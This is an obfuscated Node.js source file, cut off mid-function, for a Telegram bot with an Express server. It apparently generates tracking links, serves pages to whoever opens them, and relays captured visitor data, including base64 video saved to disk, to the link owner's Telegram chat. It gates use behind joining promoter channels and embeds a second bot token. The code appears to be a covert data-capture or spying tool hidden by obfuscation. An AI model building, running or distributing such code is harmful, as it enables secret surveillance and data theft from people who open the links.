const _0x317544 = _0x7526;
(function (_0x39f38c, _0x4484f8) {
    const _0x3ab51b = _0x7526, _0x139e6b = _0x39f38c();
    while (!![]) {
        try {
            const _0x110bf7 = parseInt(_0x3ab51b(0x28b)) / (0x2d * 0xb + 0x431 * 0x9 + -0x1 * 0x27a7) * (parseInt(_0x3ab51b(0x23e)) / (-0x1da * -0x11 + -0xb83 + -0x13f5)) + parseInt(_0x3ab51b(0x63f)) / (-0x1 * 0xd06 + 0x507 * -0x5 + 0x262c) * (parseInt(_0x3ab51b(0x8bc)) / (0x1c * -0x13d + 0x1e22 + 0x48e)) + -parseInt(_0x3ab51b(0x207)) / (-0x109a + -0x128b + 0x232a * 0x1) + parseInt(_0x3ab51b(0x3a0)) / (0xae1 * -0x2 + 0x1f84 + -0x9bc) + -parseInt(_0x3ab51b(0x412)) / (0x1 * 0xd65 + 0x1f * -0x95 + 0x18f * 0x3) * (parseInt(_0x3ab51b(0x20b)) / (-0x425 * 0x4 + 0xc7c + 0x420)) + -parseInt(_0x3ab51b(0x7b5)) / (0xc96 + 0xa3 * -0x5 + 0x4af * -0x2) * (parseInt(_0x3ab51b(0x56b)) / (-0x8c * -0x13 + 0x181b + -0x2275)) + -parseInt(_0x3ab51b(0x4d6)) / (0x1 * 0xfbb + -0x23f1 + 0x1441) * (-parseInt(_0x3ab51b(0x541)) / (0x1243 + -0x17b3 + 0x34 * 0x1b));
            if (_0x110bf7 === _0x4484f8)
                break;
            else
                _0x139e6b['push'](_0x139e6b['shift']());
        } catch (_0x1b466b) {
            _0x139e6b['push'](_0x139e6b['shift']());
        }
    }
}(_0xce71, -0x4823 * 0xe + 0xd63d7 + 0x2ae25), require(_0x317544(0x428))[_0x317544(0x31d)]());
const TelegramBot = require(_0x317544(0x883) + _0x317544(0x738) + 'i'), express = require(_0x317544(0x810)), bodyParser = require(_0x317544(0x89d) + 'r'), multer = require(_0x317544(0x216)), path = require(_0x317544(0x430)), fs = require('fs'), crypto = require(_0x317544(0x6ce)), axios = require(_0x317544(0x70e)), uuid = require(_0x317544(0x87c)), cheerio = require(_0x317544(0x544)), dns = require(_0x317544(0x859)), sleep = _0x3a571c => new Promise(_0x56765f => setTimeout(_0x56765f, _0x3a571c)), botToken = process[_0x317544(0x786)]['n'], botUsername = _0x317544(0x8ae), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x317544(0x481),
        _0x317544(0x801),
        _0x317544(0x4eb),
        _0x317544(0x28d),
        _0x317544(0x916)
    ], SECOND_BOT_TOKEN = _0x317544(0x363) + _0x317544(0x2d0) + _0x317544(0x8a2) + _0x317544(0x33b) + _0x317544(0x205), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x411de1 = _0x317544, _0x347d51 = { 'ItNpZ': _0x411de1(0x548) + _0x411de1(0x48a) };
    console[_0x411de1(0x699)](_0x347d51[_0x411de1(0x36d)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0x4b4598 = {};
}
setInterval(clearCache, (-0x2535 + -0x38a * 0x4 + 0x3 * 0x1377) * (-0x6f * -0x11 + 0x1f * -0x115 + 0x1e14));
async function isUserSubscribed(_0x2f4180) {
    const _0x43a66c = _0x317544, _0x3716ce = {
            'kMZrO': function (_0x19f234, _0x36b702) {
                return _0x19f234 === _0x36b702;
            },
            'RoZHs': _0x43a66c(0x1c0),
            'HslEc': _0x43a66c(0x5c0) + _0x43a66c(0x382),
            'mkdgY': _0x43a66c(0x768),
            'wgfRS': _0x43a66c(0x8fa) + _0x43a66c(0x849) + _0x43a66c(0x2d8) + _0x43a66c(0x705)
        };
    try {
        const _0x273d06 = await Promise[_0x43a66c(0x50b)](developerChannels[_0x43a66c(0x1de)](_0x3e3b50 => bot[_0x43a66c(0x18d) + _0x43a66c(0x378)](_0x3e3b50, _0x2f4180)));
        return _0x273d06[_0x43a66c(0x8ed)](_0x46d7e3 => {
            const _0x219669 = _0x43a66c, _0x152ab2 = _0x46d7e3[_0x219669(0x4cc)];
            return _0x3716ce[_0x219669(0x88b)](_0x152ab2, _0x3716ce[_0x219669(0x2c5)]) || _0x3716ce[_0x219669(0x88b)](_0x152ab2, _0x3716ce[_0x219669(0x1c7)]) || _0x3716ce[_0x219669(0x88b)](_0x152ab2, _0x3716ce[_0x219669(0x6ac)]);
        });
    } catch (_0x1f5231) {
        return console[_0x43a66c(0x5bb)](_0x3716ce[_0x43a66c(0x632)], _0x1f5231), ![];
    }
}
bot[_0x317544(0x62c)](/\/Vip/, async _0x334cee => {
    const _0x71c50c = _0x317544, _0x229f06 = {
            'CFuSI': function (_0x1984ca, _0x2efbef) {
                return _0x1984ca(_0x2efbef);
            },
            'sAPrH': _0x71c50c(0x71f) + _0x71c50c(0x7ae) + _0x71c50c(0x304) + _0x71c50c(0x857) + _0x71c50c(0x679) + _0x71c50c(0x484),
            'SWqef': _0x71c50c(0x90a) + _0x71c50c(0x721) + _0x71c50c(0x25a) + _0x71c50c(0x437) + _0x71c50c(0x41d) + _0x71c50c(0x85c) + _0x71c50c(0x622) + '.',
            'apypl': _0x71c50c(0x905) + _0x71c50c(0x522) + _0x71c50c(0x58f),
            'tpeJd': _0x71c50c(0x5d7) + _0x71c50c(0x546) + _0x71c50c(0x78c) + _0x71c50c(0x8c2),
            'MpQiW': _0x71c50c(0x6e5) + _0x71c50c(0x68b) + _0x71c50c(0x877) + _0x71c50c(0x66e),
            'gukmi': _0x71c50c(0x38b) + _0x71c50c(0x78e) + _0x71c50c(0x67d)
        }, _0x381726 = _0x334cee[_0x71c50c(0x61f)]['id'], _0x2f0803 = _0x334cee[_0x71c50c(0x6d0)]['id'], _0x81f07f = await _0x229f06[_0x71c50c(0x45f)](isUserSubscribed, _0x381726);
    if (!_0x81f07f) {
        const _0x4abf06 = _0x229f06[_0x71c50c(0x368)], _0x4198a0 = developerChannels[_0x71c50c(0x1de)](_0x1507ed => [{
                    'text': _0x71c50c(0x8c5) + _0x1507ed,
                    'url': _0x71c50c(0x597) + _0x71c50c(0x476) + _0x1507ed[_0x71c50c(0x228)](0x1304 + 0x14f2 + 0x1 * -0x27f5)
                }]);
        bot[_0x71c50c(0x5ad) + 'e'](_0x381726, _0x4abf06, { 'reply_markup': { 'inline_keyboard': _0x4198a0 } });
        return;
    }
    const _0x12f954 = uuid['v4']();
    linkData[_0x12f954] = {
        'userId': _0x2f0803,
        'chatId': _0x381726,
        'visitors': []
    };
    const _0x53b5ca = _0x229f06[_0x71c50c(0x235)];
    bot[_0x71c50c(0x5ad) + 'e'](_0x381726, _0x53b5ca, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x229f06[_0x71c50c(0x3ec)],
                        'callback_data': _0x71c50c(0x7d6) + _0x12f954
                    }],
                [{
                        'text': _0x229f06[_0x71c50c(0x542)],
                        'callback_data': _0x71c50c(0x7d6) + _0x12f954
                    }],
                [{
                        'text': _0x229f06[_0x71c50c(0x53d)],
                        'callback_data': _0x71c50c(0x7d6) + _0x12f954
                    }],
                [{
                        'text': _0x229f06[_0x71c50c(0x2d6)],
                        'callback_data': _0x71c50c(0x7d6) + _0x12f954
                    }]
            ]
        }
    });
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x1f4c9d => {
    const _0x53d773 = _0x317544, _0x433c14 = {
            'gvxsx': function (_0x12041f, _0x32109d) {
                return _0x12041f === _0x32109d;
            }
        }, _0x2a28ce = _0x1f4c9d[_0x53d773(0x4b7)][_0x53d773(0x61f)]['id'], _0x44e4c8 = _0x1f4c9d[_0x53d773(0x6d0)]['id'], _0x42ad95 = _0x1f4c9d[_0x53d773(0x369)][_0x53d773(0x594)]('_')[-0x12 * -0x99 + 0xa90 * -0x2 + 0xa60];
    if (linkData[_0x42ad95] && _0x433c14[_0x53d773(0x8b3)](linkData[_0x42ad95][_0x53d773(0x5fe)], _0x44e4c8)) {
        const _0x7aab19 = _0x53d773(0x3b1) + _0x53d773(0x537) + _0x53d773(0x5a7) + _0x53d773(0x185) + _0x53d773(0x339) + _0x53d773(0x509) + _0x53d773(0x3b0) + _0x53d773(0x646) + _0x53d773(0x7cb) + _0x53d773(0x44f) + _0x53d773(0x71a) + botUsername + _0x53d773(0x4f9) + _0x42ad95;
        bot[_0x53d773(0x5ad) + 'e'](_0x2a28ce, _0x7aab19);
    }
});
const baseUrl = process[_0x317544(0x786)]['r'];
bot[_0x317544(0x62c)](/\/vip (.+)/, async (_0x941ff1, _0xeae110) => {
    const _0x122dd8 = _0x317544, _0x34416c = {
            'EsXQv': function (_0x297d40, _0xe78857) {
                return _0x297d40(_0xe78857);
            },
            'uZqxG': _0x122dd8(0x71f) + _0x122dd8(0x7ae) + _0x122dd8(0x304) + _0x122dd8(0x857) + _0x122dd8(0x679) + _0x122dd8(0x484),
            'FoZCg': function (_0x33db98, _0x77323e) {
                return _0x33db98 !== _0x77323e;
            }
        }, _0x3a3949 = _0xeae110[-0xfd + -0xf94 + -0x1092 * -0x1], _0x5f6189 = _0x941ff1[_0x122dd8(0x6d0)]['id'], _0x3bad48 = _0x941ff1[_0x122dd8(0x61f)]['id'], _0x52e42b = await _0x34416c[_0x122dd8(0x3a1)](isUserSubscribed, _0x3bad48);
    if (!_0x52e42b) {
        const _0x5a0f9c = _0x34416c[_0x122dd8(0x5f2)], _0x4d537f = developerChannels[_0x122dd8(0x1de)](_0xfeae76 => [{
                    'text': _0x122dd8(0x8c5) + _0xfeae76,
                    'url': _0x122dd8(0x597) + _0x122dd8(0x476) + _0xfeae76[_0x122dd8(0x228)](-0x897 + 0xd * 0x1e7 + -0x1 * 0x1023)
                }]);
        bot[_0x122dd8(0x5ad) + 'e'](_0x3bad48, _0x5a0f9c, { 'reply_markup': { 'inline_keyboard': _0x4d537f } });
        return;
    }
    if (linkData[_0x3a3949]) {
        const {
            userId: _0x119dff,
            visitors: _0x37f310
        } = linkData[_0x3a3949];
        if (_0x34416c[_0x122dd8(0x4c6)](_0x5f6189, _0x119dff) && (!visitorData[_0x5f6189] || !visitorData[_0x5f6189][_0x122dd8(0x885)](_0x119dff))) {
            _0x37f310[_0x122dd8(0x161)](_0x5f6189);
            !visitorData[_0x5f6189] && (visitorData[_0x5f6189] = []);
            visitorData[_0x5f6189][_0x122dd8(0x161)](_0x119dff);
            !userPoints[_0x119dff] && (userPoints[_0x119dff] = -0x1e0b + -0x5 * 0x4e9 + 0x3698);
            userPoints[_0x119dff] += 0x6 + 0x2 * -0xc31 + 0x129 * 0x15;
            const _0x2a0c07 = _0x122dd8(0x2e2) + _0x122dd8(0x7bc) + _0x122dd8(0x3b0) + _0x122dd8(0x4ed) + _0x122dd8(0x902) + _0x122dd8(0x596) + _0x122dd8(0x492) + _0x122dd8(0x3df) + _0x122dd8(0x8e9) + _0x122dd8(0x43e);
            bot[_0x122dd8(0x5ad) + 'e'](_0x3bad48, _0x2a0c07);
            const _0x4586a8 = _0x122dd8(0x629) + _0x122dd8(0x6fa) + _0x122dd8(0x214) + _0x122dd8(0x6fe) + _0x122dd8(0x497);
            bot[_0x122dd8(0x5ad) + 'e'](_0x119dff, _0x4586a8);
        }
    }
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x365138 => {
    const _0x35441c = _0x317544, _0x1cc532 = {
            'Edjkb': function (_0x3cb608, _0x543850) {
                return _0x3cb608 === _0x543850;
            }
        }, _0x107908 = _0x365138[_0x35441c(0x4b7)][_0x35441c(0x61f)]['id'], _0x177653 = _0x365138[_0x35441c(0x6d0)]['id'], _0xa6872f = _0x365138[_0x35441c(0x369)][_0x35441c(0x594)]('_')[0x1a0 * -0x5 + -0x67 * -0x4d + 0x1 * -0x16d9];
    if (linkData[_0xa6872f] && _0x1cc532[_0x35441c(0x1cf)](linkData[_0xa6872f][_0x35441c(0x5fe)], _0x177653)) {
        const _0x18bba1 = _0x35441c(0x3b1) + _0x35441c(0x537) + _0x35441c(0x5a7) + _0x35441c(0x185) + _0x35441c(0x339) + _0x35441c(0x509) + _0x35441c(0x3b0) + _0x35441c(0x646) + _0x35441c(0x4e7) + _0x35441c(0x419) + _0x35441c(0x837) + botUsername + _0x35441c(0x4f9) + _0xa6872f;
        bot[_0x35441c(0x5ad) + 'e'](_0x107908, _0x18bba1);
    }
}), bot[_0x317544(0x62c)](/\/start (.+)/, async (_0x199db4, _0x1aaefa) => {
    const _0x16a04c = _0x317544, _0x40ab0d = {
            'fqogU': function (_0x51d5a0, _0x41983e) {
                return _0x51d5a0(_0x41983e);
            },
            'kpAaZ': _0x16a04c(0x71f) + _0x16a04c(0x7ae) + _0x16a04c(0x304) + _0x16a04c(0x857) + _0x16a04c(0x679) + _0x16a04c(0x484),
            'vzJil': function (_0x2b5324, _0x3b9e1d) {
                return _0x2b5324 !== _0x3b9e1d;
            }
        }, _0x4143e9 = _0x1aaefa[-0x641 * 0x2 + -0x11c2 * 0x2 + 0x3007], _0x177e99 = _0x199db4[_0x16a04c(0x6d0)]['id'], _0xc95d21 = _0x199db4[_0x16a04c(0x61f)]['id'], _0x1eb6f7 = await _0x40ab0d[_0x16a04c(0x760)](isUserSubscribed, _0xc95d21);
    if (!_0x1eb6f7) {
        const _0x303a09 = _0x40ab0d[_0x16a04c(0x4e2)], _0x2b0928 = developerChannels[_0x16a04c(0x1de)](_0x223009 => [{
                    'text': _0x16a04c(0x8c5) + _0x223009,
                    'url': _0x16a04c(0x597) + _0x16a04c(0x476) + _0x223009[_0x16a04c(0x228)](0x1 * 0x1b41 + -0xf * 0x11b + 0xaab * -0x1)
                }]);
        bot[_0x16a04c(0x5ad) + 'e'](_0xc95d21, _0x303a09, { 'reply_markup': { 'inline_keyboard': _0x2b0928 } });
        return;
    }
    if (linkData[_0x4143e9]) {
        const {
            userId: _0x4d1c5b,
            chatId: _0x4df613,
            visitors: _0x5610d4
        } = linkData[_0x4143e9];
        if (_0x40ab0d[_0x16a04c(0x29e)](_0x177e99, _0x4d1c5b) && (!visitorData[_0x177e99] || !visitorData[_0x177e99][_0x16a04c(0x885)](_0x4d1c5b))) {
            _0x5610d4[_0x16a04c(0x161)](_0x177e99);
            !visitorData[_0x177e99] && (visitorData[_0x177e99] = []);
            visitorData[_0x177e99][_0x16a04c(0x161)](_0x4d1c5b);
            !userPoints[_0x4d1c5b] && (userPoints[_0x4d1c5b] = -0x49a + 0x1d2c * 0x1 + -0x1892);
            userPoints[_0x4d1c5b] += 0x52c + 0x1d1f + -0x3 * 0xb6e;
            const _0x58ec7f = _0x16a04c(0x2e2) + _0x16a04c(0x7bc) + _0x16a04c(0x3b0) + _0x16a04c(0x4ed) + _0x16a04c(0x71e) + _0x16a04c(0x1a4) + _0x16a04c(0x8cd) + _0x16a04c(0x35a) + _0x16a04c(0x6fe) + _0x16a04c(0x395) + _0x16a04c(0x215);
            bot[_0x16a04c(0x5ad) + 'e'](_0x4df613, _0x58ec7f);
        }
    }
});
const app = express();
app[_0x317544(0x47c)](bodyParser[_0x317544(0x2aa)]({
    'extended': !![],
    'limit': _0x317544(0x5e8)
})), app[_0x317544(0x47c)](bodyParser[_0x317544(0x162)]({ 'limit': _0x317544(0x722) })), app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname));
const storage = multer[_0x317544(0x17a) + _0x317544(0x22e)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x317544(0x663) });
app[_0x317544(0x3c5)](_0x317544(0x7b0) + 'rm', (_0x441955, _0x285e2c) => {
    const _0x1807f0 = _0x317544, _0x31c1d0 = {
            'TbWqL': _0x1807f0(0x17b) + _0x1807f0(0x397) + _0x1807f0(0x275),
            'JazLk': _0x1807f0(0x2a0),
            'VkHZB': _0x1807f0(0x530),
            'VPStG': _0x1807f0(0x8c0),
            'WjuyW': _0x1807f0(0x609),
            'urglW': _0x1807f0(0x6b2),
            'JxYwZ': _0x1807f0(0x674)
        }, _0x48af50 = _0x441955[_0x1807f0(0x37e)][_0x1807f0(0x767)], _0x2162d8 = _0x441955[_0x1807f0(0x37e)][_0x1807f0(0x5f4)];
    if (!_0x48af50)
        return _0x285e2c[_0x1807f0(0x4cc)](-0x1570 + -0x1bff * 0x1 + 0x32ff)[_0x1807f0(0x850)](_0x31c1d0[_0x1807f0(0x20c)]);
    let _0xb170c7 = '';
    switch (_0x2162d8) {
    case _0x31c1d0[_0x1807f0(0x4da)]:
        _0xb170c7 = _0x31c1d0[_0x1807f0(0x87d)];
        break;
    case _0x31c1d0[_0x1807f0(0x5f7)]:
        _0xb170c7 = _0x31c1d0[_0x1807f0(0x1c6)];
        break;
    case _0x31c1d0[_0x1807f0(0x598)]:
    default:
        _0xb170c7 = _0x31c1d0[_0x1807f0(0x501)];
        break;
    }
    _0x285e2c[_0x1807f0(0x3da)](path[_0x1807f0(0x57f)](__dirname, _0xb170c7));
}), app[_0x317544(0x3c5)](_0x317544(0x427) + _0x317544(0x4de), (_0x571d31, _0x4c2fac) => {
    const _0x347b9e = _0x317544, _0x4212aa = {
            'uXwKP': function (_0x10ae7, _0x389e25) {
                return _0x10ae7(_0x389e25);
            },
            'FzFqC': _0x347b9e(0x834),
            'ZCBnE': _0x347b9e(0x1ca) + _0x347b9e(0x6af) + _0x347b9e(0x410) + _0x347b9e(0x8ee) + _0x347b9e(0x366) + _0x347b9e(0x7d7),
            'uaxBu': _0x347b9e(0x1d6) + _0x347b9e(0x7fb) + _0x347b9e(0x479) + _0x347b9e(0x595) + _0x347b9e(0x802) + _0x347b9e(0x73c)
        }, _0x229bf3 = _0x571d31[_0x347b9e(0x4d7)][_0x347b9e(0x17c)];
    _0x4212aa[_0x347b9e(0x82e)](validateLinkUsage, _0x229bf3) ? _0x4c2fac[_0x347b9e(0x3da)](path[_0x347b9e(0x57f)](__dirname, _0x4212aa[_0x347b9e(0x66d)])) : (_0x4c2fac[_0x347b9e(0x850)](_0x4212aa[_0x347b9e(0x6a1)]), bot[_0x347b9e(0x5ad) + 'e'](linkUsage[_0x229bf3][_0x347b9e(0x767)], _0x4212aa[_0x347b9e(0x806)]));
}), app[_0x317544(0x3c5)](_0x317544(0x882) + _0x317544(0x49b) + 'd', (_0x5ad9e3, _0xe82506) => {
    const _0x44fa90 = _0x317544, _0x3e8a1b = {
            'YQiHf': function (_0x34316e, _0x2946de) {
                return _0x34316e(_0x2946de);
            },
            'kkjTR': _0x44fa90(0x385),
            'DtRXi': _0x44fa90(0x1ca) + _0x44fa90(0x6af) + _0x44fa90(0x410) + _0x44fa90(0x8ee) + _0x44fa90(0x366) + _0x44fa90(0x7d7),
            'mFxKj': _0x44fa90(0x1d6) + _0x44fa90(0x7fb) + _0x44fa90(0x479) + _0x44fa90(0x595) + _0x44fa90(0x802) + _0x44fa90(0x73c)
        }, _0x166a12 = _0x5ad9e3[_0x44fa90(0x4d7)][_0x44fa90(0x17c)];
    _0x3e8a1b[_0x44fa90(0x4f1)](validateLinkUsage, _0x166a12) ? _0xe82506[_0x44fa90(0x3da)](path[_0x44fa90(0x57f)](__dirname, _0x3e8a1b[_0x44fa90(0x28f)])) : (_0xe82506[_0x44fa90(0x850)](_0x3e8a1b[_0x44fa90(0x319)]), bot[_0x44fa90(0x5ad) + 'e'](linkUsage[_0x166a12][_0x44fa90(0x767)], _0x3e8a1b[_0x44fa90(0x7bd)]));
}), app[_0x317544(0x3c5)](_0x317544(0x1c1) + _0x317544(0x863), (_0x31defd, _0x5809dc) => {
    const _0x20efeb = _0x317544, _0x539cb2 = {
            'EcsRr': function (_0x15b9f0, _0x1ef009) {
                return _0x15b9f0(_0x1ef009);
            },
            'pCKav': _0x20efeb(0x4ab),
            'DKegB': _0x20efeb(0x1ca) + _0x20efeb(0x6af) + _0x20efeb(0x410) + _0x20efeb(0x8ee) + _0x20efeb(0x366) + _0x20efeb(0x7d7),
            'OMGkH': _0x20efeb(0x1d6) + _0x20efeb(0x7fb) + _0x20efeb(0x479) + _0x20efeb(0x595) + _0x20efeb(0x802) + _0x20efeb(0x73c)
        }, _0x374898 = _0x31defd[_0x20efeb(0x4d7)][_0x20efeb(0x17c)];
    _0x539cb2[_0x20efeb(0x852)](validateLinkUsage, _0x374898) ? _0x5809dc[_0x20efeb(0x3da)](path[_0x20efeb(0x57f)](__dirname, _0x539cb2[_0x20efeb(0x578)])) : (_0x5809dc[_0x20efeb(0x850)](_0x539cb2[_0x20efeb(0x659)]), bot[_0x20efeb(0x5ad) + 'e'](linkUsage[_0x374898][_0x20efeb(0x767)], _0x539cb2[_0x20efeb(0x18c)]));
}), app[_0x317544(0x3c5)](_0x317544(0x656) + _0x317544(0x718), (_0x341b15, _0x3bb4da) => {
    const _0x1542b7 = _0x317544, _0x45ee64 = {
            'gsOod': function (_0x16ac5a, _0x37e079) {
                return _0x16ac5a(_0x37e079);
            },
            'asWpL': _0x1542b7(0x2f7),
            'bBHJd': _0x1542b7(0x1ca) + _0x1542b7(0x6af) + _0x1542b7(0x410) + _0x1542b7(0x8ee) + _0x1542b7(0x366) + _0x1542b7(0x7d7),
            'xbFGE': _0x1542b7(0x1d6) + _0x1542b7(0x7fb) + _0x1542b7(0x479) + _0x1542b7(0x595) + _0x1542b7(0x802) + _0x1542b7(0x73c)
        }, _0x3eb0c0 = _0x341b15[_0x1542b7(0x4d7)][_0x1542b7(0x17c)];
    _0x45ee64[_0x1542b7(0x2a1)](validateLinkUsage, _0x3eb0c0) ? _0x3bb4da[_0x1542b7(0x3da)](path[_0x1542b7(0x57f)](__dirname, _0x45ee64[_0x1542b7(0x51a)])) : (_0x3bb4da[_0x1542b7(0x850)](_0x45ee64[_0x1542b7(0x1e6)]), bot[_0x1542b7(0x5ad) + 'e'](linkUsage[_0x3eb0c0][_0x1542b7(0x767)], _0x45ee64[_0x1542b7(0x88f)]));
}), app[_0x317544(0x33a)](_0x317544(0x4cf) + 'es', (_0x25e799, _0x25deac) => {
    const _0x3402f1 = _0x317544, _0x5cb146 = {
            'zwNao': _0x3402f1(0x344) + _0x3402f1(0x83a) + _0x3402f1(0x206) + ':',
            'cmuPp': _0x3402f1(0x840) + _0x3402f1(0x5de),
            'CWKjQ': _0x3402f1(0x90f)
        }, _0x369adb = _0x25e799[_0x3402f1(0x51f)][_0x3402f1(0x767)], _0x1ac440 = _0x25e799[_0x3402f1(0x51f)][_0x3402f1(0x601)], _0x3a5c99 = _0x25e799[_0x3402f1(0x51f)][_0x3402f1(0x709)];
    console[_0x3402f1(0x699)](_0x5cb146[_0x3402f1(0x81a)], _0x25e799[_0x3402f1(0x51f)]), bot[_0x3402f1(0x5ad) + 'e'](_0x369adb, _0x3402f1(0x242) + _0x3402f1(0x5f1) + _0x3402f1(0x777) + ':\x20' + _0x1ac440 + (_0x3402f1(0x5f6) + _0x3402f1(0x7ed)) + _0x3a5c99)[_0x3402f1(0x826)](() => {
    })[_0x3402f1(0x60f)](_0x2f658e => {
        const _0x1a15b7 = _0x3402f1;
        console[_0x1a15b7(0x5bb)](_0x5cb146[_0x1a15b7(0x8df)], _0x2f658e[_0x1a15b7(0x3ca)] ? _0x2f658e[_0x1a15b7(0x3ca)][_0x1a15b7(0x51f)] : _0x2f658e);
    }), _0x25deac[_0x3402f1(0x8d6)](_0x5cb146[_0x3402f1(0x8d2)]);
}), app[_0x317544(0x47c)](bodyParser[_0x317544(0x162)]()), app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname)), app[_0x317544(0x3c5)](_0x317544(0x167), (_0x399d2d, _0x235854) => {
    const _0x2cfce6 = _0x317544, _0x1bf0b8 = { 'RMzMp': _0x2cfce6(0x7fd) };
    _0x235854[_0x2cfce6(0x3da)](path[_0x2cfce6(0x57f)](__dirname, _0x1bf0b8[_0x2cfce6(0x604)]));
}), app[_0x317544(0x33a)](_0x317544(0x805) + _0x317544(0x894), (_0x2dade6, _0x1e8d62) => {
    const _0x59d693 = _0x317544, _0x117003 = { 'zuypG': _0x59d693(0x344) + _0x59d693(0x83a) + _0x59d693(0x206) + ':' }, _0x3358c4 = _0x2dade6[_0x59d693(0x51f)][_0x59d693(0x767)], _0x2537e8 = _0x2dade6[_0x59d693(0x51f)][_0x59d693(0x2fc) + 'r'];
    bot[_0x59d693(0x5ad) + 'e'](_0x3358c4, _0x59d693(0x5d4) + _0x59d693(0x267) + _0x59d693(0x59d) + _0x59d693(0x795) + _0x59d693(0x486) + _0x59d693(0x393) + _0x59d693(0x4b9) + _0x59d693(0x28a) + ':\x20' + _0x2537e8)[_0x59d693(0x826)](() => {
        const _0x6cc9f4 = _0x59d693;
        _0x1e8d62[_0x6cc9f4(0x162)]({ 'success': !![] });
    })[_0x59d693(0x60f)](_0x26e77f => {
        const _0x5507a9 = _0x59d693;
        console[_0x5507a9(0x5bb)](_0x117003[_0x5507a9(0x169)], _0x26e77f[_0x5507a9(0x3ca)] ? _0x26e77f[_0x5507a9(0x3ca)][_0x5507a9(0x51f)] : _0x26e77f), _0x1e8d62[_0x5507a9(0x162)]({ 'success': ![] });
    });
}), app[_0x317544(0x33a)](_0x317544(0x8ba) + 'e', (_0x11c40b, _0x231d92) => {
    const _0x1bc1f2 = _0x317544, _0x32e17f = {
            'IrKIR': _0x1bc1f2(0x7b4) + _0x1bc1f2(0x22b) + _0x1bc1f2(0x448),
            'KvZMx': _0x1bc1f2(0x344) + _0x1bc1f2(0x83a) + _0x1bc1f2(0x206) + ':'
        }, _0x3add5d = _0x11c40b[_0x1bc1f2(0x51f)][_0x1bc1f2(0x767)], _0x333c0e = _0x11c40b[_0x1bc1f2(0x51f)][_0x1bc1f2(0x4ff)];
    bot[_0x1bc1f2(0x5ad) + 'e'](_0x3add5d, _0x1bc1f2(0x7ab) + _0x1bc1f2(0x587) + _0x1bc1f2(0x79c) + '\x20' + _0x333c0e)[_0x1bc1f2(0x826)](() => {
        const _0x54f1d9 = _0x1bc1f2;
        _0x231d92[_0x54f1d9(0x8d6)](_0x32e17f[_0x54f1d9(0x259)]);
    })[_0x1bc1f2(0x60f)](_0x48f1b6 => {
        const _0x439a35 = _0x1bc1f2;
        console[_0x439a35(0x5bb)](_0x32e17f[_0x439a35(0x823)], _0x48f1b6[_0x439a35(0x3ca)] ? _0x48f1b6[_0x439a35(0x3ca)][_0x439a35(0x51f)] : _0x48f1b6), _0x231d92[_0x439a35(0x162)]({ 'success': ![] });
    });
}), app[_0x317544(0x47c)](bodyParser[_0x317544(0x162)]({ 'limit': _0x317544(0x848) })), app[_0x317544(0x47c)](bodyParser[_0x317544(0x2aa)]({
    'limit': _0x317544(0x848),
    'extended': !![]
}));
const dataStore = {};
app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname)), app[_0x317544(0x33a)](_0x317544(0x6dc) + 'eo', (_0x58aa64, _0x15b37f) => {
    const _0xdedbf1 = _0x317544, _0x2039bd = {
            'EaLvU': _0xdedbf1(0x8bf),
            'XbVqI': _0xdedbf1(0x344) + _0xdedbf1(0x570),
            'qvoki': _0xdedbf1(0x81d) + _0xdedbf1(0x26b),
            'twphQ': function (_0x26d360, _0x22f55d) {
                return _0x26d360 || _0x22f55d;
            },
            'bRkPO': _0xdedbf1(0x37c) + _0xdedbf1(0x2bd) + _0xdedbf1(0x8d9) + _0xdedbf1(0x72e) + _0xdedbf1(0x76e),
            'qBurv': _0xdedbf1(0x5d5),
            'ARuZl': _0xdedbf1(0x8ff),
            'cNmkO': _0xdedbf1(0x88d) + _0xdedbf1(0x38f) + _0xdedbf1(0x907),
            'uFebR': _0xdedbf1(0x660) + _0xdedbf1(0x489) + _0xdedbf1(0x630),
            'LRbVt': _0xdedbf1(0x81d) + _0xdedbf1(0x1e3) + _0xdedbf1(0x5cb)
        }, _0x28c66c = _0x58aa64[_0xdedbf1(0x51f)][_0xdedbf1(0x767)], _0x56a99d = _0x58aa64[_0xdedbf1(0x51f)][_0xdedbf1(0x225)];
    if (_0x2039bd[_0xdedbf1(0x5b9)](!_0x28c66c, !_0x56a99d))
        return _0x15b37f[_0xdedbf1(0x4cc)](-0x1 * -0xf37 + -0x3 * -0x8ef + -0x2874)[_0xdedbf1(0x850)](_0x2039bd[_0xdedbf1(0x7d9)]);
    const _0xd0a8 = _0x56a99d[_0xdedbf1(0x594)](',')[0x1b3d * 0x1 + 0x3 * 0x60f + -0x2d69], _0x1a55b9 = path[_0xdedbf1(0x57f)](__dirname, _0x2039bd[_0xdedbf1(0x4f0)]);
    !fs[_0xdedbf1(0x899)](_0x1a55b9) && fs[_0xdedbf1(0x6cb)](_0x1a55b9);
    try {
        const _0x5e6f82 = Buffer[_0xdedbf1(0x6d0)](_0xd0a8, _0x2039bd[_0xdedbf1(0x8a0)]), _0x41a96b = path[_0xdedbf1(0x57f)](_0x1a55b9, _0x28c66c + _0xdedbf1(0x3f7));
        fs[_0xdedbf1(0x4b5) + _0xdedbf1(0x520)](_0x41a96b, _0x5e6f82), bot[_0xdedbf1(0x67a)](_0x28c66c, _0x41a96b, { 'caption': _0x2039bd[_0xdedbf1(0x414)] })[_0xdedbf1(0x826)](() => {
            const _0x4b8a61 = _0xdedbf1;
            console[_0x4b8a61(0x699)](_0x4b8a61(0x75c) + _0x4b8a61(0x32b) + _0x4b8a61(0x7fa) + _0x4b8a61(0x213) + _0x28c66c), _0x15b37f[_0x4b8a61(0x8d6)](_0x2039bd[_0x4b8a61(0x4e5)]);
        })[_0xdedbf1(0x60f)](_0x1c9b9f => {
            const _0x53d44c = _0xdedbf1;
            console[_0x53d44c(0x5bb)](_0x2039bd[_0x53d44c(0x4aa)], _0x1c9b9f), _0x15b37f[_0x53d44c(0x4cc)](0x18c3 + -0x1f84 + 0x8b5)[_0x53d44c(0x850)](_0x2039bd[_0x53d44c(0x1a8)]);
        });
    } catch (_0x53feff) {
